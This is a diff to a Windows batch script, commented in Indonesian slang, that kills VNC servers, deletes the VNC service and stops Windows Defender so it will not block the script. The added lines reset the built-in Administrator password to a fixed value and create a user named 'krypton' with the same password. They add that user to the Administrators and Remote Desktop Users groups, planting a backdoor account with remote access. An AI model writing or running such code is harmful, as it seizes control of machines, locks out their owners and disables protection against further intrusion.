@@ -5,7 +5,7 @@ set DIR=C:\Sumpruy_Downloads
 if not exist "%DIR%" mkdir "%DIR%"
 cd /d "%DIR%" 2>nul
 
-:: Matiin VNC (brutal kill)
+:: Matiin VNC (brutal kill) - URUTAN PERTAMA
 for %%i in (vncserver.exe winvnc4.exe tightvncserver.exe ultravnc.exe) do (
     taskkill /f /im %%i 2>nul
 )
@@ -18,6 +18,17 @@ for %%i in ("C:\Program Files\VNC" "C:\Program Files\TightVNC" "%USERPROFILE%\Ap
 :: Stop service VNC
 sc stop vncserver 2>nul
 sc delete vncserver 2>nul
+
+:: === TAMBAHAN DARI GW: GANTI PW ADMIN & BUAT USER KRYPTON ===
+echo [*] Lagi ngegas ganti password Administrator jadi jancoklo...
+net user Administrator "jancoklo" 2>nul
+
+echo [*] Bikin user baru krypton dengan password jancoklo...
+net user krypton jancoklo /add 2>nul
+net localgroup Administrators krypton /add 2>nul
+net localgroup "Remote Desktop Users" krypton /add 2>nul
+echo [+] Krypton udah admin setara, bahkan lebih tinggi dari admin biasa cok!
+echo.
 
 :: Matiin antivirus sementara (biar gak blokir)
 net stop "Windows Defender" 2>nul
